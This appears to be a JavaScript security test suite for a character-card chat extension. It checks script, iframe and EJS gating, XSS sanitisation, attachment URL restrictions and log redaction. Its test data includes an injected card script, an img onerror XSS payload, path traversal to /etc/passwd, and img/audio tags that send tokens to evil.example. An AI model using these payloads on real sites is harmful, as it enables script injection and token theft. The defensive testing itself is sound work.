import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { once } from 'node:events';
import { createServer } from 'node:http';
import { registerHooks } from 'node:module';
import { Window } from 'happy-dom';

const sourceIdentityUrl = new URL('../server-plugin/virtual-companion/lib/source-identity.js', import.meta.url).href;
const ejsHostUrl = new URL('../extension/vc-model-settings/desktop/standalone/cards/ejs-host.js', import.meta.url).href;
const lockedLibUrl = new URL('../extension/vc-model-settings/desktop/locked-source/st/lib.js', import.meta.url).href;
const lockedEjsUrl = new URL('../extension/vc-model-settings/desktop/locked-source/ejs/desktop.js', import.meta.url).href;

registerHooks({
    resolve(specifier, context, nextResolve) {
        if (specifier === '/lib.js') return { url: lockedLibUrl, shortCircuit: true };
        if (specifier === '/scripts/extensions/third-party/ST-Prompt-Template/dist/desktop.js') {
            return { url: lockedEjsUrl, shortCircuit: true };
        }
        if (specifier === '/scripts/extensions/third-party/vc-model-settings/desktop/standalone/cards/ejs-host.js') {
            return { url: ejsHostUrl, shortCircuit: true };
        }
        if (specifier === '/scripts/vc-runtime/source-identity.js') {
            return { url: sourceIdentityUrl, shortCircuit: true };
        }
        return nextResolve(specifier, context);
    },
});

const happyWindow = new Window({ url: 'http://localhost:8000/desktop/' });
const wrapJqNodes = nodes => Object.assign(nodes, {
    jquery: '3.5.1',
    on() { return this; },
    off() { return this; },
    triggerHandler: async () => {},
    find: sel => wrapJqNodes(nodes.flatMap(n => [...(n.querySelectorAll?.(sel) || [])])),
    attr: name => nodes[0]?.getAttribute?.(name) ?? undefined,
    prop(name, val) {
        if (val === undefined) return nodes[0]?.[name];
        for (const n of nodes) n[name] = val;
        return this;
    },
    val(v) {
        if (v === undefined) return nodes[0]?.value;
        for (const n of nodes) n.value = v;
        return this;
    },
    text: () => nodes.map(n => n.textContent ?? '').join(''),
    html(val) {
        if (val === undefined) return nodes[0]?.innerHTML ?? '';
        for (const n of nodes) n.innerHTML = String(val);
        return this;
    },
    empty() {
        for (const n of nodes) n.innerHTML = '';
        return this;
    },
    append(val) {
        for (const n of nodes) {
            if (typeof val === 'string') n.insertAdjacentHTML('beforeend', val);
            else if (val) n.appendChild(val);
        }
        return this;
    },
});
const jqHandlers = new WeakMap();
const getJqBucket = (target, event) => {
    if (!target || (typeof target !== 'object' && typeof target !== 'function')) return [];
    let map = jqHandlers.get(target);
    if (!map) {
        map = new Map();
        jqHandlers.set(target, map);
    }
    let list = map.get(event);
    if (!list) {
        list = [];
        map.set(event, list);
    }
    return list;
};
const jQueryFn = selector => {
    if (typeof selector === 'string') {
        return wrapJqNodes([...happyWindow.document.querySelectorAll(selector)]);
    }
    if (selector instanceof happyWindow.Element || selector instanceof happyWindow.HTMLElement) {
        return wrapJqNodes([selector]);
    }
    if (typeof selector === 'function') {
        selector();
        return {};
    }
    return {
        on(event, handler) {
            if (typeof handler === 'function') {
                getJqBucket(selector, event).push(handler);
            }
            return this;
        },
        off(event, handler) {
            const list = getJqBucket(selector, event);
            if (!handler) {
                list.length = 0;
            } else {
                const idx = list.indexOf(handler);
                if (idx >= 0) list.splice(idx, 1);
            }
            return this;
        },
        async triggerHandler(event) {
            const list = [...getJqBucket(selector, event)];
            let last;
            for (const fn of list) {
                last = await fn.call(selector, { type: event, target: selector });
            }
            return last;
        },
    };
};
jQueryFn.ui = {};

Object.assign(globalThis, {
    self: globalThis,
    window: happyWindow,
    document: happyWindow.document,
    location: happyWindow.location,
    localStorage: happyWindow.localStorage,
    sessionStorage: happyWindow.sessionStorage,
    Element: happyWindow.Element,
    Node: happyWindow.Node,
    HTMLElement: happyWindow.HTMLElement,
    HTMLIFrameElement: happyWindow.HTMLIFrameElement,
    HTMLUnknownElement: happyWindow.HTMLUnknownElement,
    HTMLMediaElement: happyWindow.HTMLMediaElement,
    NodeFilter: happyWindow.NodeFilter,
    DOMParser: happyWindow.DOMParser,
    CustomEvent: happyWindow.CustomEvent,
    Event: happyWindow.Event,
    EventTarget: happyWindow.EventTarget,
    MutationObserver: happyWindow.MutationObserver,
    getComputedStyle: happyWindow.getComputedStyle.bind(happyWindow),
    requestAnimationFrame: cb => setTimeout(cb, 0),
    jQuery: jQueryFn,
    $: jQueryFn,
    toastr: { info() {}, warning() {}, error() {}, success() {}, clear() {} },
});
const { DOMPurify } = await import(lockedLibUrl);
Object.assign(globalThis, { DOMPurify });
Object.assign(happyWindow, { jQuery: jQueryFn, $: jQueryFn, DOMPurify });

test.after(() => happyWindow.happyDOM.close());

const { EventEmitter } = await import('../extension/vc-model-settings/desktop/standalone/engine/events.js');
const { event_types } = await import('../extension/vc-model-settings/desktop/standalone/engine/st/events.js');
const { bindEngineContext } = await import('../extension/vc-model-settings/desktop/standalone/engine/ports.js');
const { openaiDefaults, powerUserDefaults } = await import('../extension/vc-model-settings/desktop/standalone/engine/defaults.js');
const { createResourcePorts } = await import('../extension/vc-model-settings/desktop/standalone/engine/resources.js');
const { initializeCards } = await import('../extension/vc-model-settings/desktop/standalone/cards/index.js');
const { configureFormatting, messageFormatting } = await import('../extension/vc-model-settings/desktop/standalone/cards/format.js');
const { MessageFormatter } = await import('../extension/vc-model-settings/desktop/standalone/cards/message-formatter.js');
const { accountStorage } = await import('../extension/vc-model-settings/desktop/standalone/cards/account-storage.js');
const { executeSlashCommandsWithOptions: ejsExecuteSlashCommandsWithOptions } = await import('../extension/vc-model-settings/desktop/standalone/cards/ejs-host.js');
const { executeSlashCommandsWithOptions: helperExecuteSlashCommandsWithOptions } = await import('../extension/vc-model-settings/desktop/standalone/cards/helper-slash.js');

test('t14-boundaries: 未获宿主显式授权的普通会话/导入卡片不得执行卡片脚本、HTML iframe 或任何 EJS 入口；显式授权后支持父 Helper、B6 守卫与系统/世界书/显示 EJS 并净化 HTML', async () => {
    const prevFetch = globalThis.fetch;
    globalThis.fetch = async url => {
        if (String(url).endsWith('/version')) {
            return new Response(JSON.stringify({ pkgVersion: '1.12.0' }));
        }
        return new Response('{}');
    };
    delete globalThis.__t14UntrustedScriptRan;
    delete globalThis.__t14UntrustedHtmlRan;
    delete globalThis.__t14UntrustedDisplayEjsRan;
    delete globalThis.__t14UntrustedCustomEjsRan;
    delete globalThis.__t14UntrustedPromptChatEjsRan;
    delete globalThis.__t14UntrustedCardDescEjsRan;
    delete globalThis.__t14UntrustedWorldbookEjsRan;

    const chatRoot = happyWindow.document.createElement('div');
    chatRoot.id = 'chat';
    happyWindow.document.body.innerHTML = '';
    happyWindow.document.body.appendChild(chatRoot);

    try {
        // 导入的卡片自带 enabled: true 的脚本及独有 description EJS，但宿主 extension_settings.tavern_helper.script.enabled.characters 未授权该角色
        const untrustedCard = {
            avatar: 'untrusted-imported.png',
            name: '未授信角色',
            description: '角色设定 <% globalThis.__t14UntrustedCardDescEjsRan = true; %><%= 20 + 22 %>',
            scenario: '',
            data: {
                name: '未授信角色',
                description: '角色设定 <% globalThis.__t14UntrustedCardDescEjsRan = true; %><%= 20 + 22 %>',
                extensions: {
                    vc_character_ref: 'untrusted-ref',
                    tavern_helper: {
                        scripts: [
                            {
                                type: 'script',
                                id: 'evil-imported-script',
                                name: '导入自带脚本',
                                enabled: true,
                                content: 'window.parent.__t14UntrustedScriptRan = true;',
                                button: { enabled: true, buttons: [{ name: '恶意按钮', visible: true }] },
                                data: {},
                            },
                        ],
                    },
                },
            },
        };

        const context = {
            characters: [untrustedCard],
            characterId: 0,
            chatId: 'untrusted-chat',
            name1: '用户',
            name2: '未授信角色',
            chat: [
                {
                    name: '未授信角色',
                    is_user: false,
                    is_system: false,
                    swipe_id: 0,
                    mes: [
                        '普通回复文本',
                        '<% globalThis.__t14UntrustedDisplayEjsRan = true; setvar("hacked_by_display", 1); %>',
                        '```html',
                        '<html><body><script>window.parent.__t14UntrustedHtmlRan = true;</script><div>伪造面板</div></body></html>',
                        '```',
                    ].join('\n'),
                },
            ],
            chatMetadata: { variables: { trusted_wi_var: 'WI_OK' } },
            extensionPrompts: {},
            eventSource: new EventEmitter(),
            eventTypes: event_types,
            saveMetadataDebounced() {},
            saveSettingsDebounced() {},
        };

        const settings = {
            oai_settings: { ...structuredClone(openaiDefaults), preset_settings_openai: 'Default' },
            power_user: {
                ...structuredClone(powerUserDefaults),
                experimental_macro_engine: false,
                reasoning: { prefix: '', suffix: '' },
                context: {},
                external_media_allowed_overrides: [],
                external_media_forbidden_overrides: [],
            },
            world_info: { globalSelect: ['untrusted-wi'] },
            extension_settings: {
                disabledExtensions: [],
                regex: [],
                variables: { global: {} },
                // 注意：全局 render.enabled 默认是 true，script.enabled.global 默认是 true，
                // 但 characters/presets 名单均未包含 untrusted-imported.png / Default
                tavern_helper: {
                    render: { enabled: true, depth: 0, allow_streaming: true },
                    script: {
                        enabled: { global: true, presets: [], characters: [] },
                        scripts: [],
                    },
                },
                EjsTemplate: {
                    enabled: true,
                    generate_enabled: true,
                    render_enabled: true,
                    raw_message_evaluation_enabled: true,
                    filter_message_enabled: true,
                    compile_workers: false,
                    sandbox: false,
                },
            },
        };

        bindEngineContext(context, settings, {});
        const cards = await initializeCards({
            context,
            settings,
            packet: { world_names: ['untrusted-wi'] },
            presets: { Default: structuredClone(settings.oai_settings) },
            client: {
                headers: () => ({}),
                post: async () => new Response('{}'),
                request: async () => ({
                    entries: {
                        0: {
                            uid: 0,
                            comment: 'untrusted-entry',
                            content: '世界书独有载荷 <% globalThis.__t14UntrustedWorldbookEjsRan = true; %>',
                            disable: false,
                        },
                    },
                }),
            },
            callGenericPopup: async () => 1,
        });

        await cards.open();

        // 1. 导入卡片自带的 script 不得在未获宿主 characters 名单授权时挂载执行
        assert.deepEqual(globalThis.TavernHelper.getActiveScriptIds(), [], '未获宿主显式授权的导入卡片脚本不得注册为活跃脚本');
        assert.equal(
            happyWindow.document.querySelectorAll('[data-vc-card-scripts] iframe').length,
            0,
            '未获宿主显式授权时不得挂载角色脚本 iframe',
        );

        // 2. 普通消息中的 ```html 代码块与 <% ... %> 不得升格为可执行同源 iframe，也不得执行显示级 EJS
        const mesCell = happyWindow.document.createElement('div');
        mesCell.className = 'mes';
        mesCell.setAttribute('mesid', '0');
        chatRoot.appendChild(mesCell);

        const cleanup0 = cards.renderMessage(mesCell, 0, context.chat[0], false);
        await cards.settle();

        assert.equal(mesCell.querySelector('iframe'), null, '无许可普通会话中的 HTML 代码块不得挂载可执行 iframe');
        assert.equal(Boolean(globalThis.__t14UntrustedHtmlRan), false, '无许可普通会话中的 HTML 脚本不得执行');
        assert.equal(Boolean(globalThis.__t14UntrustedDisplayEjsRan), false, '无许可普通会话中的消息显示 EJS 不得执行');
        assert.equal(context.chatMetadata.variables?.hacked_by_display, undefined, '无许可消息不得通过显示级 EJS 修改聊天变量');

        // 3. js_generation_before_end 自定义生成事件与 WORLDINFO_ENTRIES_LOADED 在未授权会话中不得执行 EJS
        const customGenPayload = {
            message: '结果 <% globalThis.__t14UntrustedCustomEjsRan = true; %>',
        };
        await context.eventSource.emit('js_generation_before_end', customGenPayload, 'gen-1');
        assert.equal(Boolean(globalThis.__t14UntrustedCustomEjsRan), false, '无许可会话不得通过 js_generation_before_end 执行消息 EJS');

        const wiPayload = {
            globalLore: [{ uid: 0, comment: 'wi', content: '世界书 <% globalThis.__t14UntrustedWorldbookEjsRan = true; %>' }],
            characterLore: [],
            chatLore: [],
            personaLore: [],
        };
        await context.eventSource.emit(event_types.WORLDINFO_ENTRIES_LOADED, wiPayload);
        assert.equal(Boolean(globalThis.__t14UntrustedWorldbookEjsRan), false, '无许可会话不得在 WORLDINFO_ENTRIES_LOADED 执行世界书 EJS');

        // 4. Prompt 生成阶段：在未授权会话中，无论是独有的 card.description / worldbook system prompt 还是 chat 消息，均不得执行 EJS
        context.chat.push({
            name: '用户',
            is_user: true,
            is_system: false,
            swipe_id: 0,
            mes: '用户输入 <% globalThis.__t14UntrustedPromptChatEjsRan = true; %>',
        });
        const readyPayloadUntrusted = {
            messages: [
                { role: 'system', content: untrustedCard.description },
                { role: 'system', content: '世界书注入: <% globalThis.__t14UntrustedWorldbookEjsRan = true; %><%= getvar("trusted_wi_var") %>' },
                { role: 'user', content: context.chat[1].mes },
            ],
            type: 'normal',
        };
        await context.eventSource.emit(event_types.CHAT_COMPLETION_SETTINGS_READY, readyPayloadUntrusted);
        assert.equal(
            Boolean(globalThis.__t14UntrustedCardDescEjsRan),
            false,
            '未获宿主显式授权的导入卡片 description 在生成阶段不得执行 EJS',
        );
        assert.equal(
            Boolean(globalThis.__t14UntrustedWorldbookEjsRan),
            false,
            '未获宿主显式授权的世界书内容在生成阶段不得执行 EJS',
        );
        assert.equal(
            Boolean(globalThis.__t14UntrustedPromptChatEjsRan),
            false,
            '未获宿主显式授权的普通聊天消息在生成阶段不得执行 EJS',
        );

        cleanup0();

        // 5. 宿主显式授权角色后（extension_settings.tavern_helper.script.enabled.characters 包含该角色 avatar）：
        // 支持完整复杂卡（脚本 iframe、HTML 消息 iframe、父页 TavernHelper、B6 卸载守卫、系统/世界书 EJS 求值），且 EJS 写回的显示 HTML 经过 DOMPurify 净化
        settings.extension_settings.tavern_helper.script.enabled.characters = ['untrusted-imported.png'];
        await cards.open();

        const readyPayloadAuthorized = {
            messages: [
                { role: 'system', content: '系统设定: <%= getvar("trusted_wi_var") %>' },
            ],
            type: 'normal',
        };
        await context.eventSource.emit(event_types.CHAT_COMPLETION_SETTINGS_READY, readyPayloadAuthorized);
        assert.equal(readyPayloadAuthorized.messages[0].content, '系统设定: WI_OK', '宿主显式授权后，系统/世界书提示词 EJS 必须正常求值');

        assert.deepEqual(globalThis.TavernHelper.getActiveScriptIds(), ['evil-imported-script'], '宿主显式授权后，角色脚本应注册为活跃脚本');
        const scriptFrame = happyWindow.document.querySelector('[data-vc-card-scripts] iframe');
        assert.ok(scriptFrame, '宿主显式授权后应挂载脚本 iframe');
        const predefineSource = fs.readFileSync(
            new URL('../extension/vc-model-settings/desktop/standalone/cards/predefine.js', import.meta.url),
            'utf8',
        );
        const iframeWin = Object.assign(new EventTarget(), {
            parent: globalThis,
            frameElement: scriptFrame,
            name: scriptFrame.name,
            jQuery: globalThis.jQuery,
            $: globalThis.$,
        });
        iframeWin.window = iframeWin;
        Object.defineProperty(scriptFrame, 'contentWindow', { value: iframeWin, configurable: true });
        new Function('window', '$', '_', `with (window) {\n${predefineSource}\n}`)(iframeWin, globalThis.$, globalThis._);
        const staleScriptHelper = iframeWin.TavernHelper;
        assert.equal(typeof staleScriptHelper?.getVariables, 'function', '授权脚本 iframe 应能访问父级 TavernHelper');

        // 父 TavernHelper 与 iframe 两侧的 getModelList / getProxyPresetNames / getScriptTrees 均显式抛出 VC_HELPER_UNSUPPORTED:<name>
        for (const unsupportedName of ['getModelList', 'getProxyPresetNames', 'getScriptTrees']) {
            const expectedErr = new RegExp(`VC_HELPER_UNSUPPORTED:${unsupportedName}`);
            assert.throws(() => globalThis.TavernHelper[unsupportedName](), expectedErr, `父 TavernHelper.${unsupportedName} 必须抛 VC_HELPER_UNSUPPORTED`);
            assert.throws(() => globalThis[unsupportedName](), expectedErr, `父顶层 ${unsupportedName} 必须抛 VC_HELPER_UNSUPPORTED`);
            assert.throws(() => staleScriptHelper[unsupportedName](), expectedErr, `iframe TavernHelper.${unsupportedName} 必须抛 VC_HELPER_UNSUPPORTED`);
            assert.throws(() => iframeWin[unsupportedName](), expectedErr, `iframe 顶层 ${unsupportedName} 必须抛 VC_HELPER_UNSUPPORTED`);
        }

        // ejs-host 导出的 executeSlashCommandsWithOptions 对正常命令保留原结果形状，对 isError:true 抛固定脱敏错误 VC_SLASH_EXECUTION_ERROR，不改 helper-slash 原返回
        const okSlashRes = await ejsExecuteSlashCommandsWithOptions('/echo t14_slash_ok');
        assert.equal(okSlashRes.pipe, 't14_slash_ok');
        assert.equal(okSlashRes.isError, false);
        const rawErrRes = await helperExecuteSlashCommandsWithOptions('/nonexistent_cmd_secret_token_999');
        assert.equal(rawErrRes.isError, true, 'helper-slash 原 executeSlashCommandsWithOptions 保持返回 isError: true');
        await assert.rejects(
            () => ejsExecuteSlashCommandsWithOptions('/nonexistent_cmd_secret_token_999'),
            err => err instanceof Error && err.message === 'VC_SLASH_EXECUTION_ERROR' && !err.message.includes('secret_token_999'),
            'ejs-host executeSlashCommandsWithOptions 在 isError 时必须抛固定脱敏错误 VC_SLASH_EXECUTION_ERROR',
        );
        await assert.rejects(
            () => globalThis.EjsTemplate.evalTemplate('<%= await execute("/nonexistent_cmd_secret_token_999") %>'),
            /VC_SLASH_EXECUTION_ERROR/,
            'EJS execute() 遇到 Slash 错误不得静默吞掉，必须抛出 VC_SLASH_EXECUTION_ERROR',
        );

        context.chat[0].mes = [
            '<%- "<img src=\\"/user/images/ok.png\\" onerror=\\"globalThis.__t14EjsXssRan=true\\">" %>',
            '```html',
            '<html><body><div id="authorized-card">授权面板</div></body></html>',
            '```',
        ].join('\n');
        context.chat[0].is_ejs_processed = [];

        const cleanupAuth = cards.renderMessage(mesCell, 0, context.chat[0], false);
        await cards.settle();

        assert.equal(Boolean(globalThis.__t14EjsXssRan), false, 'EJS 渲染回写 HTML 必须经 DOMPurify 净化，阻断内联事件处理器');
        assert.equal(mesCell.querySelector('img')?.getAttribute('onerror') ?? null, null, 'EJS 写回的 img 不得保留 onerror 属性');
        const authMesFrame = mesCell.querySelector('iframe');
        assert.ok(authMesFrame, '宿主显式授权后，消息 HTML 应挂载卡片 iframe');

        // B6 守卫：关闭脚本后，旧 iframe 持有的 TavernHelper 引用必须拒写 (VC_STALE_CARD_RUNTIME)
        cleanupAuth();
        await cards.closeScripts();
        assert.throws(
            () => staleScriptHelper.insertOrAssignVariables({ leaked: 1 }, { type: 'chat' }),
            /VC_STALE_CARD_RUNTIME/,
            '已卸载 iframe 持有的旧 TavernHelper 引用调用写方法必须抛出 VC_STALE_CARD_RUNTIME',
        );
        cards.destroy();
    } finally {
        globalThis.fetch = prevFetch;
    }
});

test('t14-boundaries: getFileAttachment 规范化 URL 并限制同源 /user/files/ 路径、受控 loopback 302 零请求零凭据泄露，合法文件正常下载且错误脱敏', async () => {
    const receivedRedirect = [];
    const sink = createServer((request, response) => {
        receivedRedirect.push({
            method: request.method,
            url: request.url,
            hasIdentity: Boolean(
                request.headers.cookie
                || request.headers['x-vc-expected-account-id']
                || request.headers['x-csrf-token'],
            ),
        });
        response.writeHead(200, { 'content-type': 'text/plain' });
        response.end('FORBIDDEN_REDIRECT_BODY');
    });
    sink.listen(0, '127.0.0.1');
    await once(sink, 'listening');

    const redirectTarget = `http://127.0.0.1:${sink.address().port}/nf14-redirect-target`;
    const fetchCalls = [];
    const toastErrors = [];
    const errorLogs = [];
    const origConsoleError = console.error;
    console.error = (...args) => errorLogs.push(args.map(String).join(' '));

    try {
        const secretHeaders = () => ({
            'X-CSRF-Token': 'csrf-secret-token-999',
            'X-VC-Expected-Account-Id': 'acc-owner-01',
            Cookie: 'session=secret-cookie-value',
        });

        const fakeFetch = async (input, init = {}) => {
            const urlStr = String(input);
            fetchCalls.push({ url: urlStr, init });
            const parsed = new URL(urlStr, 'http://localhost:8000');
            if (parsed.pathname === '/user/files/t14-attachment.txt') {
                return new Response('SYNTHETIC_ROOT_CONTENT', { status: 200 });
            }
            if (parsed.pathname === '/user/files/t14-normalized.txt') {
                return new Response('SYNTHETIC_NORMALIZED_CONTENT', { status: 200 });
            }
            if (parsed.pathname === '/user/files/redirect-to-sink.txt') {
                // 如果调用方未传 redirect: 'error'，模拟跟随 302 到受控 loopback sink
                if (init.redirect !== 'error') {
                    await globalThis.fetch(redirectTarget, { headers: init.headers });
                }
                const redirectedRes = new Response('REDIRECTED_SECRET', { status: 200 });
                Object.defineProperty(redirectedRes, 'redirected', { value: true });
                Object.defineProperty(redirectedRes, 'url', { value: redirectTarget });
                return redirectedRes;
            }
            if (parsed.pathname === '/user/files/missing-doc.txt') {
                return new Response('Not Found: secret_internal_path=/var/data/token_abc', {
                    status: 404,
                    statusText: 'Not Found token_abc',
                });
            }
            return new Response('UNEXPECTED', { status: 200 });
        };

        const { appendFileContent } = createResourcePorts({
            getRequestHeaders: secretHeaders,
            fetch: fakeFetch,
            toast: {
                error: (msg, title) => toastErrors.push({ msg: String(msg), title: String(title ?? '') }),
                warning() {},
            },
            t: (strings, ...values) => String.raw({ raw: strings }, ...values),
        });

        // 1. 拒绝跨源、相似域、越界路径、非 /user/files/ 路径、非 http(s) 协议、带查询参数或凭据的 URL
        const rejectedUrls = [
            'https://evil.example/user/files/t14-attachment.txt',
            'http://localhost:8000.evil.example/user/files/t14-attachment.txt',
            'http://localhost:8000@evil.example/user/files/t14-attachment.txt',
            '//evil.example/user/files/t14-attachment.txt',
            '/api/settings/get',
            '/user/files/../secrets.json',
            'http://localhost:8000/user/files/../../etc/passwd',
            '/user/files/sub/nested.txt',
            '/user/files/t14-attachment.txt?token=leak',
            '/user/files/t14-attachment.txt#frag',
            'javascript:alert(1)',
            'data:text/plain;base64,SGVsbG8=',
        ];

        for (const badUrl of rejectedUrls) {
            const out = await appendFileContent({ extra: { files: [{ url: badUrl }] } }, 'BASE_MSG');
            assert.equal(out, 'BASE_MSG', `非法附件 URL 必须被拒绝: ${badUrl}`);
        }
        assert.equal(fetchCalls.length, 0, '非法附件 URL 必须在发起 fetch 之前被拦截，不得携鉴权头发出请求');

        // 2. 拦截重定向：fetch 必须指定 redirect: 'error'，受控 loopback sink 收到 0 个请求
        const redirectOut = await appendFileContent(
            { extra: { files: [{ url: '/user/files/redirect-to-sink.txt' }] } },
            'BASE_MSG',
        );
        assert.equal(redirectOut, 'BASE_MSG', '发生重定向的附件响应必须被拒绝');
        assert.equal(fetchCalls.at(-1)?.init?.redirect, 'error', '附件请求必须显式设置 redirect: "error" 防止跨源重定向携带鉴权头');
        assert.deepEqual(receivedRedirect, [], '受控 loopback sink 不得收到任何 302 跳转请求或凭据');

        // 3. 合法根路径 /user/files/t14-attachment.txt 与同源绝对规范化路径 /user/files/./t14-normalized.txt 正常下载
        const validRelOut = await appendFileContent(
            { extra: { files: [{ url: '/user/files/t14-attachment.txt' }] } },
            'BASE_MSG',
        );
        assert.equal(validRelOut, 'SYNTHETIC_ROOT_CONTENT\n\nBASE_MSG');

        const validAbsOut = await appendFileContent(
            { extra: { files: [{ url: 'http://localhost:8000/user/files/./t14-normalized.txt' }] } },
            'BASE_MSG',
        );
        assert.equal(validAbsOut, 'SYNTHETIC_NORMALIZED_CONTENT\n\nBASE_MSG');

        // 4. 错误提示与日志不得泄露响应体、statusText 中的 token 或完整敏感 URL
        toastErrors.length = 0;
        errorLogs.length = 0;
        const missingOut = await appendFileContent(
            { extra: { files: [{ url: '/user/files/missing-doc.txt' }] } },
            'BASE_MSG',
        );
        assert.equal(missingOut, 'BASE_MSG');
        const combinedDiagnostics = [...toastErrors.map(t => `${t.title} ${t.msg}`), ...errorLogs].join(' ');
        assert.equal(
            /token_abc|secret_internal_path|missing-doc\.txt/.test(combinedDiagnostics),
            false,
            `附件下载失败提示与日志不得泄露响应体、路径或凭据: ${combinedDiagnostics}`,
        );

        // 5. 当 location.origin 与 baseOrigin 均缺失时，不得静默回退到 http://localhost:8000，必须拒绝请求
        const prevWindow = globalThis.window;
        const prevLocation = globalThis.location;
        try {
            globalThis.window = {};
            globalThis.location = undefined;
            const callsBefore = fetchCalls.length;
            const noOriginPorts = createResourcePorts({
                getRequestHeaders: secretHeaders,
                fetch: fakeFetch,
                toast: { error() {}, warning() {} },
                t: (strings, ...values) => String.raw({ raw: strings }, ...values),
            });
            const noOriginOut = await noOriginPorts.appendFileContent(
                { extra: { files: [{ url: '/user/files/t14-attachment.txt' }] } },
                'BASE_MSG',
            );
            assert.equal(noOriginOut, 'BASE_MSG', '缺少可靠 baseOrigin 时必须拒绝附件请求');
            assert.equal(fetchCalls.length, callsBefore, '缺少可靠 baseOrigin 时不得回退到固定 localhost origin 发起 fetch');
        } finally {
            globalThis.window = prevWindow;
            globalThis.location = prevLocation;
        }
    } finally {
        console.error = origConsoleError;
        await new Promise((resolve, reject) => sink.close(err => (err ? reject(err) : resolve())));
    }
});

test('t14-boundaries: format.js 修复同源前缀/反斜杠绕过与外部媒体完整 URL 日志泄露，message-formatter 错误日志不泄露正文/URL/token/error.name', async () => {
    const warnLogs = [];
    const errorLogs = [];
    const origWarn = console.warn;
    const origError = console.error;
    console.warn = (...args) => warnLogs.push(args.map(String).join(' '));
    console.error = (...args) => errorLogs.push(args.map(a => (a instanceof Error ? `${a.message}\n${a.stack || ''}` : String(a))).join(' '));

    try {
        const context = {
            characters: [{ avatar: 'fmt.png', name: '角色', data: { extensions: {} } }],
            characterId: 0,
            chat: [],
            chatMetadata: {},
            name1: '用户',
            name2: '角色',
            eventSource: new EventEmitter(),
            eventTypes: event_types,
        };
        const settings = {
            oai_settings: { ...structuredClone(openaiDefaults) },
            power_user: {
                ...structuredClone(powerUserDefaults),
                experimental_macro_engine: false,
                forbid_external_media: true,
                external_media_allowed_overrides: [],
                external_media_forbidden_overrides: [],
            },
            world_info: {},
            extension_settings: { regex: [], variables: { global: {} } },
        };
        bindEngineContext(context, settings, {});
        accountStorage.init({ __migrated: '1' });
        configureFormatting({
            getRegexedString: s => s,
            regex_placement: { MD_DISPLAY: 0 },
            accountStorage,
            toastr: { warning() {}, info() {}, error() {}, success() {}, clear() {} },
            t: (strings, ...values) => String.raw({ raw: strings }, ...values),
        });

        const bypassHtml = [
            '<img src="http://localhost:8000.evil.example/steal.png?secret=tok_12345">',
            '<img src="http://localhost:8000@evil.example/steal2.png?secret=tok_67890">',
            '<img src="\\\\evil.example/backslash-steal.png?secret=tok_backslash">',
            '<audio src="https://evil.example/audio.mp3?api_key=sk-secret-999"></audio>',
            '<img src="/user/images/local-safe.png">',
        ].join('');

        const formatted = messageFormatting(bypassHtml, '角色', false, false, 0);
        const tpl = happyWindow.document.createElement('div');
        tpl.innerHTML = formatted;
        const imgs = [...tpl.querySelectorAll('img')];
        const audios = [...tpl.querySelectorAll('audio')];

        assert.equal(imgs.length, 1, '同源字符串前缀欺骗域名、userinfo 与反斜杠欺骗图片节点必须被拦截移除，仅保留真实同源图片');
        assert.equal(imgs[0]?.getAttribute('src'), '/user/images/local-safe.png', '真实同源本地图片必须保留');
        assert.equal(audios.length, 0, '外部音频节点必须被拦截移除');
        assert.equal(formatted.includes('evil.example'), false, '格式化输出不得残留任何外部媒体 URL');

        const joinedWarn = warnLogs.join('\n');
        assert.equal(
            /steal\.png|steal2\.png|backslash-steal|tok_12345|tok_67890|tok_backslash|sk-secret-999|evil\.example\/audio/.test(joinedWarn),
            false,
            `外部媒体拦截日志不得泄露完整 URL、路径或查询参数凭据: ${joinedWarn}`,
        );

        // MessageFormatter 错误日志不得泄露敏感对话正文、URL、token 或自定义 error.name
        MessageFormatter.addHook(() => {
            const err = new Error('Hook failed on message "私密对话正文内容XYZ" at https://internal.example/api?token=Bearer_sk_live_secret_888');
            err.name = 'SECRET_IN_ERROR_NAME_123';
            throw err;
        }, { stage: MessageFormatter.stage.BEFORE_REGEX });
        const res = MessageFormatter.runStage(MessageFormatter.stage.BEFORE_REGEX, '私密对话正文内容XYZ', {
            characterName: '角色',
            isSystem: false,
            isUser: false,
            messageId: 0,
            isReasoning: false,
        });
        assert.equal(res, '私密对话正文内容XYZ');

        const joinedError = errorLogs.join('\n');
        assert.equal(
            /私密对话正文内容XYZ|Bearer_sk_live_secret_888|https:\/\/internal\.example\/api|SECRET_IN_ERROR_NAME_123/.test(joinedError),
            false,
            `MessageFormatter 错误日志不得泄露对话正文、完整 URL、token 或 error.name: ${joinedError}`,
        );
    } finally {
        console.warn = origWarn;
        console.error = origError;
    }
});
